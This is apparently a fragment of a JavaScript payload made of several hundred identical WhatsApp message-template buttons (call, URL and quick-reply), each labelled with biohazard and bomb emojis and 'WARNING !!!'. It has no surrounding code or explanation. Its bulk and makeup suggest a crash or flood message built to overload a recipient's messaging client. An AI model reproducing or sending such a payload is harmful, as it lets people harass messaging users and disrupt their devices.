{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
